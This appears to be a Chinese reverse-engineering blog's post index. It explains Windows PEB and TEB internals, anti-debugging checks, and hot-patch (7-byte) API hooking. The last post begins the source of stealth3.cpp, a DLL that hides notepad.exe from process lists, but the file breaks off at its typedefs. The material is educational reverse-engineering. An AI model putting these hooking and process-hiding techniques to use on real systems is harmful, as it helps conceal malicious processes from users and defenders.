[4] UChar   +0x110 LoaderLock       : Ptr64 _RTL_CRITICAL_SECTION   +0x118 OSMajorVersion   : Uint4B   +0x11c OSMinorVersion   : Uint4B   +0x120 OSBuildNumber    : Uint2B   +0x122 OSCSDVersion     : Uint2B   +0x124 OSPlatformId     : Uint4B   +0x128 ImageSubsystem   : Uint4B   +0x12c ImageSubsystemMajorVersion : Uint4B   +0x130 ImageSubsystemMinorVersion : Uint4B   +0x134 Padding4         : [4] UChar   +0x138 ActiveProcessAffinityMask : Uint8B   +0x140 GdiHandleBuffer  : [60] Uint4B   +0x230 PostProcessInitRoutine : Ptr64     void    +0x238 TlsExpansionBitmap : Ptr64 Void   +0x240 TlsExpansionBitmapBits : [32] Uint4B   +0x2c0 SessionId        : Uint4B   +0x2c4 Padding5         : [4] UChar   +0x2c8 AppCompatFlags   : _ULARGE_INTEGER   +0x2d0 AppCompatFlagsUser : _ULARGE_INTEGER   +0x2d8 pShimData        : Ptr64 Void   +0x2e0 AppCompatInfo    : Ptr64 Void   +0x2e8 CSDVersion       : _UNICODE_STRING   +0x2f8 ActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA   +0x300 ProcessAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP   +0x308 SystemDefaultActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA   +0x310 SystemAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP   +0x318 MinimumStackCommit : Uint8B   +0x320 SparePointers    : [4] Ptr64 Void   +0x340 SpareUlongs      : [5] Uint4B   +0x358 WerRegistrationData : Ptr64 Void   +0x360 WerShipAssertPtr : Ptr64 Void   +0x368 pUnused          : Ptr64 Void   +0x370 pImageHeaderHash : Ptr64 Void   +0x378 TracingFlags     : Uint4B   +0x378 HeapTracingEnabled : Pos 0, 1 Bit   +0x378 CritSecTracingEnabled : Pos 1, 1 Bit   +0x378 LibLoaderTracingEnabled : Pos 2, 1 Bit   +0x378 SpareTracingBits : Pos 3, 29 Bits   +0x37c Padding6         : [4] UChar   +0x380 CsrServerReadOnlySharedMemoryBase : Uint8B   +0x388 TppWorkerpListLock : Uint8B   +0x390 TppWorkerpList   : _LIST_ENTRY   +0x3a0 WaitOnAddressHashTable : [128] Ptr64 Void   +0x7a0 TelemetryCoverageHeader : Ptr64 Void   +0x7a8 CloudFileFlags   : Uint4B   +0x7ac CloudFileDiagFlags : Uint4B   +0x7b0 PlaceholderCompatibilityMode : Char   +0x7b1 PlaceholderCompatibilityModeReserved : [7] Char   +0x7b8 LeapSecondData   : Ptr64 _LEAP_SECOND_DATA   +0x7c0 LeapSecondFlags  : Uint4B   +0x7c0 SixtySecondEnabled : Pos 0, 1 Bit   +0x7c0 Reserved         : Pos 1, 31 Bits   +0x7c4 NtGlobalFlag2    : Uint4B\n\n\n\nPEB的重要成员以下基于Win7 x86介绍 PEB的重要成员\nPEB结构体非常庞大，下面是与代码逆向分析相关的几个重要成员：\n123456789+0x002 BeingDebugged    : UChar+0x008 ImageBaseAddress : Ptr32 Void+0x00c Ldr              : Ptr32 _PEB_LDR_DATA+0x018 ProcessHeap      : Ptr32 Void+0x068 NtGlobalFlag     : Uint4B\n\nPEB.BeingDebugged（+0x2）Kernel32.dll中有个名为Kernel32!IsDebuggerPresent()的API：\n1BOOL WINAPI IsDebuggerPresent(void)\n\n顾名思义，该API函数用于判断当前进程是否处于调试状态，并返回判断结果。该API通过检测PEB.BeingDebugged成员来确定是否正在调试进程（是，则返回1；否，则返回0）。下面通过x32dbg查看其实现。\n①首先点击菜单栏的符号，然后在左边的模块选择kernelbase.dll，接着在右边搜索框输入关键词查找，看到IsDebuggerPresent() 函数后，双击即可进入函数内部\n\n\n\n\n\n\n\n\n\nWindows 7中，IsDebuggerPresent() API是在Kernelbase.dll中实现的。而在Windows XP及以前版本的操作系统中，它是在Kernel32.dll中实现的。\n\n②IsDebuggerPresent() 函数内部首先使用FS:[30]获取PEB结构体地址，图中为003B1000，然后再获取PEB.BeingDebugged成员的值（即003B1000+0x2&#x3D;003B1002地址处的值），图中为1（TRUE），表示当前进程处于调试状态。\n API函数内部.png)\nPEB.ImageBaseAddress（+0x8）PEB.ImageBaseAddress成员用来表示进程的ImageBase，GetModuleHandle() API用来获取ImageBase。\n123HMODULE WINAPI GetModuleHandle(\t__in_opt LPCTSTR lpModuleName);\n\n向lpModuleName参数赋值为NULL，调用GetModuleHandle() 函数将返回进程被加载的ImageBase。如下图所示，GetModuleHandle() 函数内部首先判断传入的参数（[ebp+8]）是否为0（NULL），若是，则跳转到75DE8E56处；跟踪到75DE8E56处可以看到，首先使用FS:[18]获取TEB的地址并赋值给eax，然后再通过[eax+30]获取PEB结构体的地址并赋值给eax，最后听过[eax+8]获取PEB.ImageBaseAddress成员的值并赋值给eax（函数的返回值）。\n API函数内部.png)\nPEB.Ldr（+0xC）PEB.Ldr成员是指向_PEB_LDR_DATA结构体的指针，使用Windbg调试器命令dt _PEB_LDR_DATA查看_PEB_LDR_DATA结构体成员如下：\n12345678910110: kd&gt; dt _PEB_LDR_DATAntdll!_PEB_LDR_DATA   +0x000 Length           : Uint4B   +0x004 Initialized      : UChar   +0x008 SsHandle         : Ptr32 Void   +0x00c InLoadOrderModuleList : _LIST_ENTRY   +0x014 InMemoryOrderModuleList : _LIST_ENTRY   +0x01c InInitializationOrderModuleList : _LIST_ENTRY   +0x024 EntryInProgress  : Ptr32 Void   +0x028 ShutdownInProgress : UChar   +0x02c ShutdownThreadId : Ptr32 Void\n\n当模块（DLL）加载到进程后，通过PEB.Ldr成员可以直接获取该模块的加载基地址，所以PEB.Ldr是非常重要的成员。\n_PEB_LDR_DATA结构体成员中有3个_LIST_ENTRY类型的成员（InLoadOrderModuleList 、InMemoryOrderModuleList、InInitializationOrderModuleList），_LIST_ENTRY结构体的定义如下：\n1234typedef struct _LIST_ENTRY&#123;\tstruct _LIST_ENTRY *Flink;    struct _LIST_ENTRY *Blink;&#125;LIST_ENTRY,*PLIST_ENTRY;\n\n由定义可知，_LIST_ENTRY结构体提供了双向链表机制，链表中保存_LDR_DATA_TABLE_ENTRY结构体的信息，该结构体的定义如下：\n12345678910111213141516171819202122232425260: kd&gt; dt _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY   +0x000 InLoadOrderLinks : _LIST_ENTRY   +0x008 InMemoryOrderLinks : _LIST_ENTRY   +0x010 InInitializationOrderLinks : _LIST_ENTRY   +0x018 DllBase          : Ptr32 Void   +0x01c EntryPoint       : Ptr32 Void   +0x020 SizeOfImage      : Uint4B   +0x024 FullDllName      : _UNICODE_STRING   +0x02c BaseDllName      : _UNICODE_STRING   +0x034 Flags            : Uint4B   +0x038 LoadCount        : Uint2B   +0x03a TlsIndex         : Uint2B   +0x03c HashLinks        : _LIST_ENTRY   +0x03c SectionPointer   : Ptr32 Void   +0x040 CheckSum         : Uint4B   +0x044 TimeDateStamp    : Uint4B   +0x044 LoadedImports    : Ptr32 Void   +0x048 EntryPointActivationContext : Ptr32 _ACTIVATION_CONTEXT   +0x04c PatchInformation : Ptr32 Void   +0x050 ForwarderLinks   : _LIST_ENTRY   +0x058 ServiceTagLinks  : _LIST_ENTRY   +0x060 StaticLinks      : _LIST_ENTRY   +0x068 ContextInformation : Ptr32 Void   +0x06c OriginalBase     : Uint4B   +0x070 LoadTime         : _LARGE_INTEGER\n\n每个加载到进程中的DLL模块都有与之对应的_LDR_DATA_TABLE_ENTRY结构体，这些结构体相互链接，最终形成_LIST_ENTRY双向链表。需要注意的是，_PEB_LDR_DATA结构体中存在三种链表，也就是说，存在多个_LDR_DATA_TABLE_ENTRY结构体，并且有3种链接方法可以将它们链接起来。\nPEB.ProcessHeap（+0x18）与PEB.NtGlobalFlag（+0x68）PEB.ProcessHeap与PEB.NtGlobalFlag成员应用于反调试技术。若进程处于调试状态，则ProcessHeap与NtGlobalFlag成员就持有特定的值。后面将详细说明。\n","slug":"认识PEB","date":"2022-04-09T14:10:54.000Z","categories_index":"","tags_index":"逆向,PEB","author_index":"0netry"},{"id":"cd812a002a8157c55aad5231f6135034","title":"认识TEB","content":"TEB（Threat Environment Block，线程环境块）\nTEB指线程环境块，该结构体包含进程中运行线程的各种信息，进程中的每个线程都对应一个TEB结构体。不同OS中TEB结构体的形态略微不同。\nTEB 结构体的定义TEB结构体成员使用Windbg调试器命令dt _TEB或dt ntdll!_TEB获取TEB结构体的组成成员如下所示：\nWin7 x86中：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001010: kd&gt; dt _tebntdll!_TEB   +0x000 NtTib            : _NT_TIB   +0x01c EnvironmentPointer : Ptr32 Void   +0x020 ClientId         : _CLIENT_ID   +0x028 ActiveRpcHandle  : Ptr32 Void   +0x02c ThreadLocalStoragePointer : Ptr32 Void   +0x030 ProcessEnvironmentBlock : Ptr32 _PEB   +0x034 LastErrorValue   : Uint4B   +0x038 CountOfOwnedCriticalSections : Uint4B   +0x03c CsrClientThread  : Ptr32 Void   +0x040 Win32ThreadInfo  : Ptr32 Void   +0x044 User32Reserved   : [26] Uint4B   +0x0ac UserReserved     : [5] Uint4B   +0x0c0 WOW32Reserved    : Ptr32 Void   +0x0c4 CurrentLocale    : Uint4B   +0x0c8 FpSoftwareStatusRegister : Uint4B   +0x0cc SystemReserved1  : [54] Ptr32 Void   +0x1a4 ExceptionCode    : Int4B   +0x1a8 ActivationContextStackPointer : Ptr32 _ACTIVATION_CONTEXT_STACK   +0x1ac SpareBytes       : [36] UChar   +0x1d0 TxFsContext      : Uint4B   +0x1d4 GdiTebBatch      : _GDI_TEB_BATCH   +0x6b4 RealClientId     : _CLIENT_ID   +0x6bc GdiCachedProcessHandle : Ptr32 Void   +0x6c0 GdiClientPID     : Uint4B   +0x6c4 GdiClientTID     : Uint4B   +0x6c8 GdiThreadLocalInfo : Ptr32 Void   +0x6cc Win32ClientInfo  : [62] Uint4B   +0x7c4 glDispatchTable  : [233] Ptr32 Void   +0xb68 glReserved1      : [29] Uint4B   +0xbdc glReserved2      : Ptr32 Void   +0xbe0 glSectionInfo    : Ptr32 Void   +0xbe4 glSection        : Ptr32 Void   +0xbe8 glTable          : Ptr32 Void   +0xbec glCurrentRC      : Ptr32 Void   +0xbf0 glContext        : Ptr32 Void   +0xbf4 LastStatusValue  : Uint4B   +0xbf8 StaticUnicodeString : _UNICODE_STRING   +0xc00 StaticUnicodeBuffer : [261] Wchar   +0xe0c DeallocationStack : Ptr32 Void   +0xe10 TlsSlots         : [64] Ptr32 Void   +0xf10 TlsLinks         : _LIST_ENTRY   +0xf18 Vdm              : Ptr32 Void   +0xf1c ReservedForNtRpc : Ptr32 Void   +0xf20 DbgSsReserved    : [2] Ptr32 Void   +0xf28 HardErrorMode    : Uint4B   +0xf2c Instrumentation  : [9] Ptr32 Void   +0xf50 ActivityId       : _GUID   +0xf60 SubProcessTag    : Ptr32 Void   +0xf64 EtwLocalData     : Ptr32 Void   +0xf68 EtwTraceData     : Ptr32 Void   +0xf6c WinSockData      : Ptr32 Void   +0xf70 GdiBatchCount    : Uint4B   +0xf74 CurrentIdealProcessor : _PROCESSOR_NUMBER   +0xf74 IdealProcessorValue : Uint4B   +0xf74 ReservedPad0     : UChar   +0xf75 ReservedPad1     : UChar   +0xf76 ReservedPad2     : UChar   +0xf77 IdealProcessor   : UChar   +0xf78 GuaranteedStackBytes : Uint4B   +0xf7c ReservedForPerf  : Ptr32 Void   +0xf80 ReservedForOle   : Ptr32 Void   +0xf84 WaitingOnLoaderLock : Uint4B   +0xf88 SavedPriorityState : Ptr32 Void   +0xf8c SoftPatchPtr1    : Uint4B   +0xf90 ThreadPoolData   : Ptr32 Void   +0xf94 TlsExpansionSlots : Ptr32 Ptr32 Void   +0xf98 MuiGeneration    : Uint4B   +0xf9c IsImpersonating  : Uint4B   +0xfa0 NlsCache         : Ptr32 Void   +0xfa4 pShimData        : Ptr32 Void   +0xfa8 HeapVirtualAffinity : Uint4B   +0xfac CurrentTransactionHandle : Ptr32 Void   +0xfb0 ActiveFrame      : Ptr32 _TEB_ACTIVE_FRAME   +0xfb4 FlsData          : Ptr32 Void   +0xfb8 PreferredLanguages : Ptr32 Void   +0xfbc UserPrefLanguages : Ptr32 Void   +0xfc0 MergedPrefLanguages : Ptr32 Void   +0xfc4 MuiImpersonation : Uint4B   +0xfc8 CrossTebFlags    : Uint2B   +0xfc8 SpareCrossTebBits : Pos 0, 16 Bits   +0xfca SameTebFlags     : Uint2B   +0xfca SafeThunkCall    : Pos 0, 1 Bit   +0xfca InDebugPrint     : Pos 1, 1 Bit   +0xfca HasFiberData     : Pos 2, 1 Bit   +0xfca SkipThreadAttach : Pos 3, 1 Bit   +0xfca WerInShipAssertCode : Pos 4, 1 Bit   +0xfca RanProcessInit   : Pos 5, 1 Bit   +0xfca ClonedThread     : Pos 6, 1 Bit   +0xfca SuppressDebugMsg : Pos 7, 1 Bit   +0xfca DisableUserStackWalk : Pos 8, 1 Bit   +0xfca RtlExceptionAttached : Pos 9, 1 Bit   +0xfca InitialThread    : Pos 10, 1 Bit   +0xfca SpareSameTebBits : Pos 11, 5 Bits   +0xfcc TxnScopeEnterCallback : Ptr32 Void   +0xfd0 TxnScopeExitCallback : Ptr32 Void   +0xfd4 TxnScopeContext  : Ptr32 Void   +0xfd8 LockCount        : Uint4B   +0xfdc SpareUlong0      : Uint4B   +0xfe0 ResourceRetValue : Ptr32 Void\n\n\n\nWin10 x64中：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128kd&gt; dt ntdll!_TEB   +0x000 NtTib            : _NT_TIB   +0x038 EnvironmentPointer : Ptr64 Void   +0x040 ClientId         : _CLIENT_ID   +0x050 ActiveRpcHandle  : Ptr64 Void   +0x058 ThreadLocalStoragePointer : Ptr64 Void   +0x060 ProcessEnvironmentBlock : Ptr64 _PEB   +0x068 LastErrorValue   : Uint4B   +0x06c CountOfOwnedCriticalSections : Uint4B   +0x070 CsrClientThread  : Ptr64 Void   +0x078 Win32ThreadInfo  : Ptr64 Void   +0x080 User32Reserved   : [26] Uint4B   +0x0e8 UserReserved     : [5] Uint4B   +0x100 WOW32Reserved    : Ptr64 Void   +0x108 CurrentLocale    : Uint4B   +0x10c FpSoftwareStatusRegister : Uint4B   +0x110 ReservedForDebuggerInstrumentation : [16] Ptr64 Void   +0x190 SystemReserved1  : [30] Ptr64 Void   +0x280 PlaceholderCompatibilityMode : Char   +0x281 PlaceholderHydrationAlwaysExplicit : UChar   +0x282 PlaceholderReserved : [10] Char   +0x28c ProxiedProcessId : Uint4B   +0x290 _ActivationStack : _ACTIVATION_CONTEXT_STACK   +0x2b8 WorkingOnBehalfTicket : [8] UChar   +0x2c0 ExceptionCode    : Int4B   +0x2c4 Padding0         : [4] UChar   +0x2c8 ActivationContextStackPointer : Ptr64 _ACTIVATION_CONTEXT_STACK   +0x2d0 InstrumentationCallbackSp : Uint8B   +0x2d8 InstrumentationCallbackPreviousPc : Uint8B   +0x2e0 InstrumentationCallbackPreviousSp : Uint8B   +0x2e8 TxFsContext      : Uint4B   +0x2ec InstrumentationCallbackDisabled : UChar   +0x2ed UnalignedLoadStoreExceptions : UChar   +0x2ee Padding1         : [2] UChar   +0x2f0 GdiTebBatch      : _GDI_TEB_BATCH   +0x7d8 RealClientId     : _CLIENT_ID   +0x7e8 GdiCachedProcessHandle : Ptr64 Void   +0x7f0 GdiClientPID     : Uint4B   +0x7f4 GdiClientTID     : Uint4B   +0x7f8 GdiThreadLocalInfo : Ptr64 Void   +0x800 Win32ClientInfo  : [62] Uint8B   +0x9f0 glDispatchTable  : [233] Ptr64 Void   +0x1138 glReserved1      : [29] Uint8B   +0x1220 glReserved2      : Ptr64 Void   +0x1228 glSectionInfo    : Ptr64 Void   +0x1230 glSection        : Ptr64 Void   +0x1238 glTable          : Ptr64 Void   +0x1240 glCurrentRC      : Ptr64 Void   +0x1248 glContext        : Ptr64 Void   +0x1250 LastStatusValue  : Uint4B   +0x1254 Padding2         : [4] UChar   +0x1258 StaticUnicodeString : _UNICODE_STRING   +0x1268 StaticUnicodeBuffer : [261] Wchar   +0x1472 Padding3         : [6] UChar   +0x1478 DeallocationStack : Ptr64 Void   +0x1480 TlsSlots         : [64] Ptr64 Void   +0x1680 TlsLinks         : _LIST_ENTRY   +0x1690 Vdm              : Ptr64 Void   +0x1698 ReservedForNtRpc : Ptr64 Void   +0x16a0 DbgSsReserved    : [2] Ptr64 Void   +0x16b0 HardErrorMode    : Uint4B   +0x16b4 Padding4         : [4] UChar   +0x16b8 Instrumentation  : [11] Ptr64 Void   +0x1710 ActivityId       : _GUID   +0x1720 SubProcessTag    : Ptr64 Void   +0x1728 PerflibData      : Ptr64 Void   +0x1730 EtwTraceData     : Ptr64 Void   +0x1738 WinSockData      : Ptr64 Void   +0x1740 GdiBatchCount    : Uint4B   +0x1744 CurrentIdealProcessor : _PROCESSOR_NUMBER   +0x1744 IdealProcessorValue : Uint4B   +0x1744 ReservedPad0     : UChar   +0x1745 ReservedPad1     : UChar   +0x1746 ReservedPad2     : UChar   +0x1747 IdealProcessor   : UChar   +0x1748 GuaranteedStackBytes : Uint4B   +0x174c Padding5         : [4] UChar   +0x1750 ReservedForPerf  : Ptr64 Void   +0x1758 ReservedForOle   : Ptr64 Void   +0x1760 WaitingOnLoaderLock : Uint4B   +0x1764 Padding6         : [4] UChar   +0x1768 SavedPriorityState : Ptr64 Void   +0x1770 ReservedForCodeCoverage : Uint8B   +0x1778 ThreadPoolData   : Ptr64 Void   +0x1780 TlsExpansionSlots : Ptr64 Ptr64 Void   +0x1788 DeallocationBStore : Ptr64 Void   +0x1790 BStoreLimit      : Ptr64 Void   +0x1798 MuiGeneration    : Uint4B   +0x179c IsImpersonating  : Uint4B   +0x17a0 NlsCache         : Ptr64 Void   +0x17a8 pShimData        : Ptr64 Void   +0x17b0 HeapData         : Uint4B   +0x17b4 Padding7         : [4] UChar   +0x17b8 CurrentTransactionHandle : Ptr64 Void   +0x17c0 ActiveFrame      : Ptr64 _TEB_ACTIVE_FRAME   +0x17c8 FlsData          : Ptr64 Void   +0x17d0 PreferredLanguages : Ptr64 Void   +0x17d8 UserPrefLanguages : Ptr64 Void   +0x17e0 MergedPrefLanguages : Ptr64 Void   +0x17e8 MuiImpersonation : Uint4B   +0x17ec CrossTebFlags    : Uint2B   +0x17ec SpareCrossTebBits : Pos 0, 16 Bits   +0x17ee SameTebFlags     : Uint2B   +0x17ee SafeThunkCall    : Pos 0, 1 Bit   +0x17ee InDebugPrint     : Pos 1, 1 Bit   +0x17ee HasFiberData     : Pos 2, 1 Bit   +0x17ee SkipThreadAttach : Pos 3, 1 Bit   +0x17ee WerInShipAssertCode : Pos 4, 1 Bit   +0x17ee RanProcessInit   : Pos 5, 1 Bit   +0x17ee ClonedThread     : Pos 6, 1 Bit   +0x17ee SuppressDebugMsg : Pos 7, 1 Bit   +0x17ee DisableUserStackWalk : Pos 8, 1 Bit   +0x17ee RtlExceptionAttached : Pos 9, 1 Bit   +0x17ee InitialThread    : Pos 10, 1 Bit   +0x17ee SessionAware     : Pos 11, 1 Bit   +0x17ee LoadOwner        : Pos 12, 1 Bit   +0x17ee LoaderWorker     : Pos 13, 1 Bit   +0x17ee SkipLoaderInit   : Pos 14, 1 Bit   +0x17ee SpareSameTebBits : Pos 15, 1 Bit   +0x17f0 TxnScopeEnterCallback : Ptr64 Void   +0x17f8 TxnScopeExitCallback : Ptr64 Void   +0x1800 TxnScopeContext  : Ptr64 Void   +0x1808 LockCount        : Uint4B   +0x180c WowTebOffset     : Int4B   +0x1810 ResourceRetValue : Ptr64 Void   +0x1818 ReservedForWdf   : Ptr64 Void   +0x1820 ReservedForCrt   : Uint8B   +0x1828 EffectiveContainerId : _GUID\n\n\n\nTEB的重要成员以下基于Win7 x86介绍 TEB的重要成员\nTEB结构体的成员多而复杂，在用户模式调试中起着重要作用的成员有两个：\n123+0x000 NtTib            : _NT_TIB...+0x030 ProcessEnvironmentBlock : Ptr32 _PEB\n\nNtTib成员TEB结构体的第一个成员为_NT_TIB结构体（TIB是Thread Information Block的简称，意为”线程信息块”）\n使用Windbg命令dt _NT_TIB或 dt ntdll!_NT_TIB查看_NT_TIB结构体如下：\n123456789100: kd&gt; dt _NT_TIBntdll!_NT_TIB   +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD   +0x004 StackBase        : Ptr32 Void   +0x008 StackLimit       : Ptr32 Void   +0x00c SubSystemTib     : Ptr32 Void   +0x010 FiberData        : Ptr32 Void   +0x010 Version          : Uint4B   +0x014 ArbitraryUserPointer : Ptr32 Void   +0x018 Self             : Ptr32 _NT_TIB\n\n_NT_TIB结构体的定义如下：\n12345678910111213typedef struct _NT_TIB&#123;   struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList;     PVOID StackBase;   PVOID StackLimit;         PVOID SubSystemTib;        union&#123;   \t\tPVOID FiberData;   \t\tDWORD Version;   &#125;;          PVOID ArbitraryUserPointer;   struct _NT_TIB *Self; &#125;NT_TIB； typedef NT_TIB *PNT_TIB;\n\nExceptionList成员指向 _EXCEPTION_REGISTRATION_RECORD结构体组成的链表，它用于Windows OS的SEH。Self成员是 _NT_TIB结构体的自引用指针，也是TEB结构体的指针（因为TEB结构体的第一个成员就是 _NT_TIB结构体）。\nProcessEnvironmentBlock成员Offset 30处的ProcessEnvironmentBlock成员，它指向PEB（Process Environment Block，进程环境块）结构体的指针。PEB是进程环境块，每个进程对应1个PEB结构体，后面会详细讲解。\nTEB访问方法借助Windbg内核调试器可以很容易地访问TEB结构体。\n在用户模式下，则通过OS提供的相关API访问。\nNtdll.NtCurrentTeb()Ntdll.NtCurrentTeb() API用来返回当前线程的TEB结构体的地址。下面通过x32dbg查看其实现。\n①首先点击菜单栏的符号，然后在左边的模块选择ntdll.dll，接着在右边搜索框输入关键词查找，看到NtCurrentTeb函数后，双击即可进入函数内部\n\n②从下图中可以看出，Ntdll.NtCurrentTeb() 内部代码十分简单，只返回fs:[18]地址值。从注释框中可以看到fs:[18]的地址为002AD018，地址指向的值为002AD000，即Ntdll.NtCurrentTeb() 返回的是002AD000，该值就是当前线程的TEB的地址。在内存窗口中转到地址fs:[18]（002AD018），可以发现TEB的地址与当前FS段寄存器所指的段内存的基址是一样的。也就是说TEB与FS段寄存器有着某种关联。\n![ntdll.NtCurrentTeb API函数内部](.&#x2F;ntdll.NtCurrentTeb API函数内部.png)\nFS段寄存器SDT\n\n\n\n\n\n\n\n\nSDT位于内核内存区域，其地址存储在特殊的寄存器GDTR（Global Descriptor Table Register，全局描述符表寄存器）中。\n其实，FS段寄存器用来指示当前线程的TEB结构体。\nIA-32系统中进程的虚拟内存大小为4GB，因而需要32位的指针才能访问整个内存的空间。但FS寄存器的大小只有16位。实际上，FS寄存器并非直接指向TEB结构体的地址，它持有SDT的索引，而该索引持有实际的TEB地址。\n\n由于段寄存器实际存储的是SDT索引，所以它也被称为”段选择符”。TEB结构体位于FS段选择符所指的段内存的起始地址处。\nFS:[0x18]&#x3D;TEB起始地址12  FS:[0x18]=TEB.NtTib.Self=address of TIB=address of TEB=FS:0*FS:0是段内存的起始地址，FS段寄存器指向（Indexing）一个段描述符，而该描述符又指向段内存的起始地址。\n\n根据_NT_TIB结构体的定义可知，结构体的最后一个Self成员恰好位于TEB结构体偏移0x18的位置。Self指针变量指向_NT_TIB结构体的起始地址，也就是TEB的起始地址。\nFS:[0x30]&#x3D;PEB起始地址1FS:[0x30]=TEB.ProcessEnvironmentBlock=address of PEB\n\n通过TEB的ProcessEnvironmentBlock成员可以获取PEB结构体的起始地址，PEB结构体多用于反调试。\nFS:[0]&#x3D;SEH起始地址1FS:[0]=TEB.NtTib.ExceptionList=address of SEH\n\nSEH是Windows操作系统中的结构化异常处理机制，常用于反调试技术。\n参考链接线程结构体\n","slug":"认识TEB","date":"2022-04-08T11:55:04.000Z","categories_index":"","tags_index":"逆向,TEB","author_index":"0netry"},{"id":"d3476856058b1cb70ed747b50ca39e21","title":"HotFix Hook","content":"API代码修改技术的问题对于全局API钩取——基于Win10的隐藏notepad.exe练习——stealth2.cpp——NewCreateProcessA()函数，其结构简单梳理为：\n123456NewCreateProcessA(...)&#123;\t//①脱钩\t//②调用原始API\t//③注入\t//④挂钩&#125;\n\n为正常调用原API，需要先①脱钩（若不脱钩，调用②原始API就会陷入无限循环）。然后在钩取函数返回前再次④钩取，使之进入钩取状态。\n也就是说，每当在程序内部调用CreateProcessA()函数时，NewCreateProcessA()就会被调用执行，不断重复脱钩&#x2F;挂钩。这种操作不仅会造成性能低下，更严重的是在多线程时会产生运行时错误，这是由脱钩&#x2F;挂钩操作要对原API的前5个字节进行修改引起的。\n一个线程尝试运行某段代码时，若另一个线程正在对该段代码进行写操作，这时就会出现冲突，最终引发运行时错误。所以需要一种更安全的API钩取技术。\n热补丁（修改7个字节代码）\n\n\n\n\n\n\n\n\n热补丁对应的英文位Hot Patch或Hot Fix，与修改5个字节代码的技术不同，使用热补丁技术时将修改7个字节代码，所以该技术又称为7字节代码修改技术。\n普通API起始代码的形态（1）API代码以”MOV EDI,EDI”指令开始（IA-32指令：0x8BFF）\n（2）API代码上方有5个NOP指令（IA-32指令：0x90）\n“MOV EDI,EDI”指令大小为2个字节，用于将EDI寄存器的值再次传送给EDI寄存器，这没有什么实际意义。NOP指令为1个字节大小，不进行任何操作（该NOP指令存在于函数与函数之间，甚至都不会被执行）。也就是说，API起始代码的MOV指令（2个字节）与其上方的5个NOP指令（5个字节）合起来共7个字节的指令没有任何意义。\n很显然，kernel32.dll、user32.dll、gdi32.dll是Windows OS相当重要的库。微软为什么使用这种方式来制作系统库呢？原因是为了方便打热补丁。热补丁由API钩取组成，在进程处于运行状态时临时更改进程内存中的库文件（重启系统时，修改的目标库文件会被完全取代）。\n工作原理及特征下面使用热补丁方法钩取kernel32.CreateProcessA() API来理解学习热补丁钩取技术\n二次跳转首先将API起始代码之前的5个字节修改为FAR JMP（E9 XXXXXXXX），跳转到用户钩取函数处（989A68）。然后将API起始代码的2个字节修改为SHORT JMP指令（EB F9）。该SHORT JMP指令用来跳转到前面的FAR JMP指令处。\n修改之前\n\n修改之后\n\n调用CreateProcessA() API时，遇到API起始地址（77642082）处的JMP kernel32.7764207D指令，就会跳转到紧接其上方的指令地址（7764207D）。然后遇到JMP 989A68指令，跳转到实际钩取的函数地址（989A68）。像这样经过2次连续跳转，就完成了对指定API的钩取操作（称为二次跳转）。这一过程需要注意的是，修改的7个字节的指令（NOP*5、MOV EDI,EDI）原来都是毫无意义的。\n\n\n\n\n\n\n\n\n\n从图中的7764207D、77642082地址可以看出，虽然都是JMP指令，但指令形态不同。7764207D地址处的指令形式为E9 XXXXXXXX，大小为5字节，被称为FAR JMP，用来实现远程跳转（可以跳转到进程内存用户区域中的任意位置）；而77642082地址处的指令形式为EB YY，大小为2字节，被称为SHORT JMP，它只能以当前EIP为基准，在-128~127的范围内跳转。\n不需要在钩取函数内部进行脱钩&#x2F;挂钩操作修改代码的前5个字节进行钩取的技术，使用时需要在钩取函数内部反复脱钩、挂钩，这可能导致系统性能下降。而使用热补丁技术钩取API时，不需要在钩取函数内部进行脱钩、挂钩操作。在5个字节代码修改技术中脱钩&#x2F;挂钩是为了调用原函数，而使用热补丁技术钩取API时，在API代码遭到修改的状态下也能正常调用原API。这是因为，从API角度看只是修改了其起始代码的MOV EDI,EDI指令（无意义的2个字节），从[API起始地址+2]地址开始，仍能正常调用原API，且执行的动作完全一样。\n基于Win10的隐藏notepad.exe练习stealth3.dll使用了热补丁API钩取技术（即HotFix Hook）\nstealth3.cpp源码分析123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417#include &quot;windows.h&quot;#include &quot;stdio.h&quot;#include &quot;tchar.h&quot;#define STR_MODULE_NAME\t\t\t\t\t(L&quot;stealth3.dll&quot;)#define STR_HIDE_PROCESS_NAME\t\t\t(L&quot;notepad.exe&quot;)#define STATUS_SUCCESS\t\t\t\t\t(0x00000000L) typedef LONG NTSTATUS;typedef enum _SYSTEM_INFORMATION_CLASS &#123;    SystemBasicInformation = 0,    SystemPerformanceInformation = 2,    SystemTimeOfDayInformation = 3,    SystemProcessInformation = 5,    SystemProcessorPerformanceInformation = 8,    SystemInterruptInformation = 23,    SystemExceptionInformation = 33,    SystemRegistryQuotaInformation = 37,    SystemLookasideInformation = 45&#125; SYSTEM_INFORMATION_CLASS;typedef struct _SYSTEM_PROCESS_INFORMATION &#123;    ULONG NextEntryOffset;    BYTE Reserved1[52];    PVOID Reserved2[3];    HANDLE UniqueProcessId;    PVOID Reserved3;    ULONG HandleCount;    BYTE Reserved4[4];    PVOID Reserved5[11];    SIZE_T PeakPagefileUsage;    SIZE_T PrivatePageCount;    LARGE_INTEGER Reserved6[6];&#125; SYSTEM_PROCESS_INFORMATION, 